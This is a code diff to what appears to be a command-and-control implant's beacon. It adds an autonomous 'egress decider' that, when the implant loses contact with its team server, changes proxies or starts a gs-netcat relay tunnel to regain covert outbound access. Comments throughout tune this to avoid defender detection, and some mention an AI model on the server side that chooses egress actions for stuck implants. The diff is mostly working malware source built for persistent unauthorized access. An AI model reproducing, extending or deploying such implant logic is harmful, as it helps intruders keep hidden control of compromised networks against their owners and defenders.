@@ -1814,8 +1814,9 @@ def _rescue_class_of(exc: BaseException) -> int:
 # `c2.egress_decider` of configs/raccoon.yaml: what an implant that cannot
 # reach its team server may try on its own, in the operator's order, when
 # nobody can be reached to be asked. This section **reads** that block and
-# **refuses** one that cannot work. Choosing a rule from it is not here --
-# nothing below matches a rescue record or spends the budget.
+# **refuses** one that cannot work. Choosing a rule from it is not here:
+# the thing that matches these rules against a rescue record, spends the
+# budget and acts is `Beacon._egress_act` and the section around it.
 #
 # Why every refusal below is a log line and a disabled policy, never an
 # exception. `tunnel_config_from_yaml` above raises, and can afford to:
@@ -1935,6 +1936,14 @@ def read_egress_policy(block) -> dict:
     three keys, where each rule is `{"when": {...}, "try": "<verb>"}` with
     every `when` value normalised to a list of names. Never raises: see the
     section comment above for why a refusal on an implant is a log line.
+
+    **`budget` and `rules` mean something only when `enabled` is true.** A
+    refusal returns neither -- `_egress_disabled` says why -- but a block
+    that reads cleanly and says `enabled: false` keeps both, and the
+    shipped one is exactly that: a disabled decider carrying the
+    operator's rules so that switching it on is one word. Those rules are
+    a draft and not permission, so a consumer asks `enabled` first.
+    `Beacon.__init__` is the one consumer and does.
 
     `block` is whatever the YAML held, including None for a deployment that
     predates this feature -- which reads as off and says nothing, because
@@ -5566,6 +5575,52 @@ class Beacon:
         # Armed: set when a rescue goes out, cleared when any leg
         # delivers again. A latch, so there is no rate to detect.
         self._rescue_sent = False
+        # Whether that rescue brought back something to do. The team
+        # server answering means it is reachable and deciding, which is
+        # the decider's reason to stand down -- for the rest of the
+        # window, since the rescue is one query per window and the answer
+        # it carried is the instruction for all of it. An *empty* answer
+        # is not one: the DNS tasking route replies with an encrypted {}
+        # even when the queue is empty, on purpose, and "the rescue
+        # brought nothing back" is the cycle the decider exists for.
+        self._rescue_answered = False
+
+        # ── the egress decider ──
+        #
+        # The policy is already read: `beacon_config_from_fallback` put
+        # `read_egress_policy`'s answer here, exactly as it puts
+        # `tunnel_config_from_yaml`'s at `c2.tunnel`. A generated build
+        # has no such key at all, which is this feature's distribution
+        # rule rather than an oversight -- `configs/raccoon.yaml` never
+        # reaches a target host, so there is nothing there to read.
+        #
+        # Nothing re-reads the block. The normalised shape would not
+        # survive a second pass -- a refused policy's budget is 0, which
+        # the reader refuses by design -- and a second reading would be a
+        # second place where a policy is judged.
+        policy = c2.get("egress_decider") or {}
+        self._egress_enabled = policy.get("enabled") is True
+        # Read by value, as the gsocket leg's `enabled` is and for the
+        # same reason: this setting is the whole difference between an
+        # implant that acts on its own and one that does not, and
+        # `bool("false")` is True.
+        #
+        # `budget` and `rules` only when it is on, which is the reader's
+        # contract: the shipped block is disabled *and* carries rules, so
+        # taking them regardless would be reading a draft as permission.
+        self._egress_budget = 0
+        self._egress_rules = []     # type: List[Tuple[int, dict]]
+        if self._egress_enabled:
+            self._egress_budget = policy.get("budget") or 0
+            self._egress_rules = self._egress_usable(policy.get("rules") or [])
+        # Consecutive cycles on which no upstream leg delivered, and what
+        # this stuck window has spent of its budget. The decider may not
+        # act on the first of those cycles -- the operator's decision, and
+        # `_egress_act` is where it is kept -- and both of these reset
+        # together with the rescue latch when a leg delivers, in
+        # `_leg_recovered`.
+        self._stuck_cycles = 0
+        self._egress_spent = 0
 
         # The tunnel endpoint runs in its own process, not a thread: the
         # beacon is the access and the tunnel is the convenience, so a
@@ -6211,8 +6266,21 @@ class Beacon:
     _RESCUE_MAX_NAME = 253
 
     def _leg_recovered(self):
-        """A leg delivered something: arm the latch for the next failure."""
+        """A leg delivered something: arm the latch for the next failure.
+
+        And close the stuck window with it, which is the same event seen
+        from the decider's side: the window closes when any upstream leg
+        delivers, so the counter that says how long this outage has lasted
+        and the budget it has spent both go back to where a fresh beacon
+        starts. All four together and in one place, because a window that
+        reopened already spent would be an implant that had quietly
+        stopped deciding -- and the one caller of this is the one arm of
+        `_beacon_loop` where an upstream leg delivered.
+        """
         self._rescue_sent = False
+        self._rescue_answered = False
+        self._stuck_cycles = 0
+        self._egress_spent = 0
 
     def _rescue_name(self) -> Optional[str]:
         """The query name, or None when it will not fit.
@@ -6987,14 +7055,16 @@ class Beacon:
 
         **The one place that spawns the child, reached from two callers.**
         `_beacon_loop` calls it where it concludes that no upstream leg
-        delivered: that is the latch, and it is also the whole restart
-        loop, since a cycle whose carrier died is a cycle where nothing
+        delivered: that is the latch, from either of the two positions the
+        egress decider gives it, and it is also the whole restart loop,
+        since a cycle whose carrier died is a cycle where nothing
         delivered and the same condition brings it back. `_egress_gsocket`
         calls it for `egress gsocket`, which is an operator asking for
         that same start now instead of at the end of the next failed
-        cycle. Both arrive here, so there is still exactly one place in
-        this process that execs a `gs-netcat`, one restart delay and one
-        attempt ceiling.
+        cycle -- and also how a `gsocket` rule of the decider's policy
+        reaches the carrier. Both arrive here, so there is still exactly
+        one place in this process that execs a `gs-netcat`, one restart
+        delay and one attempt ceiling.
 
         The invariant is about the restart loop and not about the number
         of callers, which is why a second caller costs nothing where a
@@ -7009,6 +7079,9 @@ class Beacon:
         Never raises. Both callers run on the beacon thread, and the
         latch's call sits between a failed cycle and the rescue, where an
         exception would cost the rescue that is about to carry the reason.
+        With the egress decider enabled the latch moves to just after the
+        rescue instead, where an exception would cost the beacon its loop;
+        the rule is the same from either position.
         """
         if not self.gsocket_enabled:
             return False
@@ -9047,6 +9120,315 @@ class Beacon:
                 "test of the leg: the next check-in through the forward is"
                 % (pid, self.gsocket_local_port))
 
+    # ── Deciding to get out, when nobody can be asked ──
+    #
+    # The three verbs above are what an operator, or the team server's
+    # model through `try_egress`, sends a stuck implant. This is what the
+    # implant does with them when the thing that decides cannot be
+    # reached -- which is the case the rescue record exists to report, and
+    # the one case where reporting it is not enough, because
+    # `software/agent/tools/egress.py` sits on the far side of exactly the
+    # connection being established.
+    #
+    # It is for that and nothing else. Four bounds, and not one of them
+    # is in the configuration file:
+    #
+    #   * **the verbs are the three above.** A policy chooses from
+    #     `EGRESS_VERBS` and orders it and cannot add to it, which is why
+    #     `sleep` -- the one verb the server-side model reaches for on a
+    #     stuck beacon -- is unavailable here: an implant that can slow
+    #     its own check-ins with nobody to ask can talk itself into
+    #     silence.
+    #   * **not on the first stuck cycle.** The operator's decision: when
+    #     the server can be reached, the server decides. See
+    #     `_EGRESS_FIRST_ACTING_CYCLE`.
+    #   * **one attempt per cycle, never a sweep** -- `egress.py`'s own
+    #     rule, for its reason: a dozen attempts from a device
+    #     impersonating an IP phone is louder than the single short query
+    #     that reported the problem. The next cycle re-reads the evidence,
+    #     which has changed if the attempt worked.
+    #   * **a budget per stuck window**, after which this is silent and
+    #     the rescue record does its job. Going quiet is not giving up: it
+    #     is handing the decision back to a team server that can still act
+    #     the moment DNS reaches it.
+    #
+    # **Nothing here reports upstream, and that is settled rather than
+    # missing.** By the time the decider may act the rescue record has
+    # been sent -- `_maybe_rescue` is one query per window -- so there is
+    # no message left to attach the news to, and a second record would
+    # make the rescue periodic, which `_beacon_loop`'s own comment records
+    # as a defect that was measured and fixed. So each attempt writes one
+    # line to this beacon's log, which the operator reads with the `cat`
+    # verb once there is a connection, or on a recovered device. That is
+    # the only state in which the detail could reach them anyway.
+
+    # The stuck cycle from which an attempt may be made, counting the
+    # cycle that discovers the outage as 1. **Two**, and it is the
+    # operator's decision rather than a tuning value: acting on the first
+    # would mean the implant always moved before the team server had even
+    # been told it was stuck, and the two deciders racing on every drop.
+    # One cycle has to have passed without an answer.
+    #
+    # A cycle on which the rescue could not even be *sent* is such a
+    # cycle, and it is the one this feature exists for: with no DNS leg,
+    # or a resolver that never answered, `_maybe_rescue` returns None
+    # every cycle without sending anything, so no answer is ever coming.
+    _EGRESS_FIRST_ACTING_CYCLE = 2
+
+    # The two verbs `c2.proxy.mode: "none"` forbids. Not a second reading
+    # of that setting -- `_proxy_prohibited` is the one that tests it, and
+    # both verbs consult it themselves, so the prohibition binds tasking
+    # as well -- but the list of rules there is no point carrying on such
+    # a build. See `_egress_usable`.
+    _EGRESS_PROXY_VERBS = ("proxy", "rediscover")
+
+    # Which class each number is. `_RESCUE_CLASSES` maps the other way,
+    # which is the direction the legs record in; this is the direction a
+    # rule is read in, built from that same dict so that there is still
+    # one list of class names in this file and not two.
+    _EGRESS_CLASS_NAMES = {number: name
+                           for name, number in _RESCUE_CLASSES.items()}
+
+    def _egress_usable(self, rules: List[dict]) -> List[Tuple[int, dict]]:
+        """The rules this build can fire, each with its number in the file.
+
+        Only one thing is dropped: a proxy verb on a build whose
+        `c2.proxy.mode` is `none`. That mode is an instruction about how
+        this implant talks, so both proxy verbs refuse it already -- what
+        is settled here is that such a rule does not also cost the
+        *budget*, since an attempt spent on a refusal the build guarantees
+        is an attempt the carrier does not get. Dropped when the policy is
+        read rather than skipped on a stuck cycle, because the reason then
+        reaches an operator while they still have a connection to read it
+        over, and because a stuck cycle on an unreachable host is the
+        worst moment to discover that a rule was never going to work --
+        the same call `read_egress_policy` makes about a typo.
+
+        The number travels with the rule and is its position in the
+        operator's *file*: a dropped rule must not renumber the ones below
+        it, or an attempt's log line would name a row they cannot find.
+        """
+        numbered = list(enumerate(rules, 1))
+        if not self._proxy_prohibited():
+            return numbered
+        kept = []
+        for number, rule in numbered:
+            if rule.get("try") in self._EGRESS_PROXY_VERBS:
+                logger.warning(
+                    "The egress decider will never use rule %d (try: %s): "
+                    "this build's c2.proxy.mode is %r, which is an "
+                    "instruction to connect directly rather than an absence "
+                    "of one, so that verb is refused to the decider and to "
+                    "tasking alike", number, rule.get("try"), self.proxy_mode)
+                continue
+            kept.append((number, rule))
+        return kept
+
+    def _egress_state(self) -> dict:
+        """This cycle's rescue evidence, in the names a rule says.
+
+        The record as the team server renders it: one class per transport,
+        with a leg that recorded nothing reading as `not_attempted`, which
+        is what `_rescue_pack` packs for it. So a rule is written against
+        the same five lines the operator reads in the panel, rather than
+        against a second and narrower vocabulary.
+
+        A plain dict and not this beacon, because the design fixes this
+        shape: a decision engine that replaced the decision would be
+        handed this and nothing else.
+        """
+        legs = {}
+        for transport in _RESCUE_TRANSPORTS:
+            klass = self._leg_status.get(transport, (0, 0))[0]
+            # `_record_leg` clamps rather than validates, so a number no
+            # class has is reachable in principle. Rendered as itself:
+            # every name a rule may say was checked against
+            # `_RESCUE_CLASSES` when the policy was read, so a number
+            # cannot match one, and the log stays readable.
+            legs[transport] = self._EGRESS_CLASS_NAMES.get(klass, str(klass))
+        return {
+            "legs": legs,
+            "flags": [name for name, bit in _EGRESS_FLAG_BITS.items()
+                      if self._rescue_flags & bit],
+        }
+
+    @staticmethod
+    def _egress_holds(when: Dict[str, List[str]], state: dict) -> bool:
+        """Whether one rule's condition holds against that evidence.
+
+        Every key of a `when` has to hold, which `read_egress_policy`
+        records and argues: adding a key can then only narrow, and that is
+        the reading which cannot surprise somebody who is not there to be
+        surprised.
+
+        Within one key, a list of names is **any of these**. For a
+        transport it could not be anything else -- a leg carries exactly
+        one class, so "all of them" could never hold -- and `flags` is
+        read the same way so that a list means one thing in this file
+        rather than two. The cost is honest: "both flags at once" is not
+        expressible, and two rules with one flag each is how a policy says
+        "either".
+        """
+        for key, names in when.items():
+            if key == _EGRESS_WHEN_FLAGS:
+                if not any(name in state["flags"] for name in names):
+                    return False
+            elif key == _EGRESS_WHEN_ANY:
+                if not any(klass in names for klass in state["legs"].values()):
+                    return False
+            elif state["legs"].get(key) not in names:
+                return False
+        return True
+
+    def _egress_evaluate(self, state: dict) -> Optional[Tuple[int, dict]]:
+        """The first rule `state` matches: its number in the file, and it.
+
+        One argument in, one choice out, which is the shape the design
+        fixes for a later decision engine. The order is the operator's and
+        nothing here sorts or prefers: the first rule that holds *is* the
+        policy, and that is also why a rule the gate dropped is simply not
+        in this list rather than skipped over here.
+        """
+        for number, rule in self._egress_rules:
+            if self._egress_holds(rule["when"], state):
+                return number, rule
+        return None
+
+    def _egress_decide(self) -> Optional[str]:
+        """Which verb this cycle's evidence chooses, or None for no rule.
+
+        It reads `_leg_status`, `_rescue_flags` and the policy, and no
+        other state of this beacon: not the clock, not the budget, not the
+        stuck counter, not which legs are configured. That narrowness is
+        what makes it the seam the design names for stage B -- a thing
+        handed the evidence and the allowed options answers with one of
+        them, and everything that *bounds* the answer stays outside it, in
+        `_egress_act`.
+
+        `_egress_act` asks `_egress_evaluate` rather than this, because
+        its one log line names the rule that matched and this answer is
+        that answer with the rule dropped. No match and no attempt are the
+        same thing here: None, and a cycle in which the implant did
+        nothing to itself.
+        """
+        chosen = self._egress_evaluate(self._egress_state())
+        return chosen[1]["try"] if chosen is not None else None
+
+    def _egress_proxy_target(self) -> Optional[str]:
+        """Which discovered proxy to select, or None if there is none to.
+
+        The URL rather than the index, though `egress proxy` takes either:
+        the two name the same list, and a URL is what makes the attempt's
+        log line say which proxy was tried.
+
+        The active one is skipped. `proxy_found` is set where a proxy that
+        exists *refused us* -- see `_https_post` -- so a rule that chose
+        this verb fired because the proxy in use is the problem, and
+        selecting it again would spend an attempt confirming that. A PAC
+        entry is skipped for the reason the verb itself refuses one: it
+        names proxies rather than being one, so it could only ever spend
+        an attempt on a refusal.
+
+        No discovery is run here. The last one is what `egress proxy`
+        selects from, and a policy that wants a fresh list says so with a
+        `rediscover` rule above its `proxy` rule -- which is the operator
+        ordering two attempts, not this method deciding to make one.
+        """
+        active = self._proxy.active or {}
+        for candidate in self._proxy.proxies:
+            url = candidate.get("url")
+            if not url or candidate.get("is_pac"):
+                continue
+            if url == active.get("url"):
+                continue
+            return url
+        return None
+
+    def _egress_task(self, verb: str) -> Optional[str]:
+        """The task for `verb`, as an operator would type it, or None.
+
+        None is an attempt declined rather than made: the rule holds and
+        this host has nothing for it to work on. It costs no budget, so
+        the latch behind the decider still brings the carrier up on that
+        cycle.
+
+        Two of the three verbs take no argument. Choosing `egress proxy`'s
+        is here and not in the decision, because which proxy to try is a
+        fact about this host rather than about the evidence -- and the
+        decision has to stay narrow enough for something else to make it.
+        """
+        if verb != "proxy":
+            return verb
+        target = self._egress_proxy_target()
+        if target is None:
+            # Debug and not a warning: this is one line per stuck cycle for
+            # as long as the rule keeps holding, and the section above says
+            # what a per-cycle line costs on a channel nobody is reading.
+            logger.debug(
+                "egress decider: a rule chose `egress proxy` and discovery "
+                "has found nothing on this host to select, so no attempt "
+                "was made")
+            return None
+        return "proxy %s" % target
+
+    def _egress_act(self) -> bool:
+        """Make at most one autonomous attempt to get out; did it make one?
+
+        Called from the stuck branch of `_beacon_loop`, after the rescue
+        has had its chance -- the order matters and that branch says why.
+        False is every reason there is not to act: the decider is off, it
+        is too early in this window, the team server answered, the budget
+        is spent, no rule holds, or the rule that holds has nothing to
+        work on. The branch reads that False as "the latch is the
+        carrier's fallback this cycle".
+
+        **Never raises**, for the reason `_gsocket_start` gives: this runs
+        on the beacon thread inside a loop with no guard of its own, so an
+        exception here would cost the implant its loop -- which is worse
+        than any failed attempt.
+        """
+        if not self._egress_enabled:
+            return False
+        if self._stuck_cycles < self._EGRESS_FIRST_ACTING_CYCLE:
+            return False
+        if self._rescue_answered:
+            return False
+        if self._egress_spent >= self._egress_budget:
+            return False
+        chosen = self._egress_evaluate(self._egress_state())
+        if chosen is None:
+            return False
+        number, rule = chosen
+        task = self._egress_task(rule["try"])
+        if task is None:
+            return False
+
+        # Spent before the attempt and not after, so that whatever the
+        # verb does -- including raising -- this window is one attempt
+        # nearer its bound. The alternative is a verb that fails in a new
+        # way costing nothing and being tried again every cycle.
+        self._egress_spent += 1
+        try:
+            outcome = self._exec_egress(task)
+        except Exception as exc:
+            # Spelled as `_execute_task` spells it, since this is the same
+            # dispatch answering the same way, and it is the operator who
+            # reads both.
+            outcome = "[exception: %s]" % exc
+        # One line, and everything an operator needs from it: which rule
+        # of their file it was and what that rule says, the verb as they
+        # would have typed it, what this window has now spent, and what
+        # came back. The outcome is the verb's own answer, which is
+        # deliberately about what was *changed* and not about whether the
+        # implant can now get out -- the next cycle's legs report that.
+        logger.warning(
+            "Egress decider: no upstream leg has delivered for %d cycles, so "
+            "rule %d (when %s) chose `egress %s` -- attempt %d of %d in this "
+            "stuck window. It answered: %s",
+            self._stuck_cycles, number, rule["when"], task,
+            self._egress_spent, self._egress_budget, outcome)
+        return True
+
     # ── AV / EDR enumeration ──
 
     _AV_SERVICES_WIN = [
@@ -10014,13 +10396,16 @@ class Beacon:
             # exists for. Receiving work over DNS is not getting out: the
             # results of that work cannot be reported either.
             if delivered_by not in _RESCUE_UPSTREAM:
-                # The gsocket leg's latch, and the only place the carrier
-                # is ever started. This is the operator's decision and not
-                # an optimisation: a healthy implant holds no connection
-                # to the Global Socket Relay Network at all, because that
-                # is a connection a defender can see and the four legs
-                # above were working. Once started it is never stopped, so
-                # the second outage costs no readiness wait.
+                # Another cycle with no way out. Counted before anything
+                # acts on it, because this is where "the first stuck
+                # cycle" is defined and the decider may not act on it.
+                self._stuck_cycles += 1
+                # The gsocket leg's latch. It is the operator's decision
+                # and not an optimisation: a healthy implant holds no
+                # connection to the Global Socket Relay Network at all,
+                # because that is a connection a defender can see and the
+                # four legs above were working. Once started it is never
+                # stopped, so the second outage costs no readiness wait.
                 #
                 # Before `_maybe_rescue` and not after: if the carrier
                 # cannot be started, the reason is the most useful thing
@@ -10028,15 +10413,68 @@ class Beacon:
                 # would report it one cycle late. It is also the whole
                 # restart loop -- a cycle whose carrier died is a cycle
                 # where nothing delivered, so this is where it comes back.
-                if self.gsocket_enabled:
+                #
+                # **With the decider enabled the latch moves behind it**,
+                # to the bottom of this branch, which is the operator's
+                # decision too: an `egress gsocket` rule could otherwise
+                # only ever spend budget on a carrier that was already up
+                # by the time the rule was read. The enabled case pays for
+                # that twice -- the paragraph above is lost, since a
+                # carrier started after the rescue reports its problem one
+                # cycle late, and the first stuck cycle starts no carrier
+                # at all, since the decider may not act on it and neither
+                # may its fallback. Both are a trade the operator makes in
+                # a policy row rather than a constant: a first rule of
+                # `gsocket` brings the carrier up on the first cycle the
+                # decider may act, and one that tries a proxy first has
+                # spent that cycle deliberately.
+                #
+                # Disabled is how this ships, and then this line is
+                # exactly where and what it has always been --
+                # `test_gsocket_leg.py`'s latch tests describe that case
+                # and pass unchanged. A latch behind a *disabled* decider
+                # would mean a stuck implant never started its carrier,
+                # which is the leg not working in the shipped
+                # configuration.
+                #
+                # The carrier has three starters now, not one: this line,
+                # the same latch again at the bottom of this branch when
+                # the decider is enabled, and `egress gsocket` -- which is
+                # both an operator asking for it sooner and how a
+                # `gsocket` rule gets it. All of them go through
+                # `_gsocket_start`, which is still the only thing in this
+                # process that execs a `gs-netcat`, holds the restart
+                # delay and holds the attempt ceiling.
+                if self.gsocket_enabled and not self._egress_enabled:
                     self._gsocket_start()
                 # Resolved before the dispatch below, so an answer to the
                 # rescue runs like any other tasking: assigning it inside
                 # the failure arm would collect the operator's reply and
                 # then drop it, because the arm that dispatches is an elif.
                 rescued = self._maybe_rescue()
+                if rescued:
+                    # The team server answered with something to do, so it
+                    # is reachable and it is deciding. For the rest of this
+                    # window and not only this cycle: the rescue is one
+                    # query per window, so that answer is its instruction
+                    # for all of it.
+                    self._rescue_answered = True
                 if rescued and not tasking:
                     tasking = rescued
+                if self._egress_enabled:
+                    # One attempt at most, and the latch is the fallback
+                    # for a cycle on which none was made -- no rule held,
+                    # the rule that held had nothing to work on, the
+                    # server answered, or the budget is spent. Not on the
+                    # first stuck cycle: the decider may not act on it, so
+                    # the carrier it would have chosen must not arrive by
+                    # the back door either, or the policy's first rule
+                    # could never be the thing that brought it up.
+                    acted = self._egress_act()
+                    may_have_acted = (self._stuck_cycles
+                                      >= self._EGRESS_FIRST_ACTING_CYCLE)
+                    if self.gsocket_enabled and may_have_acted and not acted:
+                        self._gsocket_start()
 
             if tasking is None:
                 self._consecutive_failures += 1
